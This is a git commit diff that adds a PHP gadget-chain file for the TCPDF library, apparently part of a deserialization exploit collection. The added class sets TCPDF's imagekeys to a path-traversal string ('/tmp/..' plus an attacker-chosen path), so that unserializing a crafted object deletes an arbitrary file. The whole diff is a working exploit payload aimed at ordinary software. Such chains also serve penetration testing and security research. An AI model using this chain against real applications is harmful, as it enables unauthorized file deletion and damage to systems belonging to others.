f725a8b21779a090293331278626aff4373d7e8c
012git012 <100608357+012git012@users.noreply.github.com>
2025-04-23 15:10:33 +0300

    Update gadgets.php

--- gadgetchains/TCPDF/FD/2/gadgets.php
+++ gadgetchains/TCPDF/FD/2/gadgets.php
@@ -1,1 +1,12 @@
+<?php
 
+class TCPDF
+{
+    public $file_id;
+    public $imagekeys;
+
+    function __construct($remote_path) {
+        $this->file_id = 1;
+        $this->imagekeys = ['/tmp/..' . $remote_path];
+    }
+}
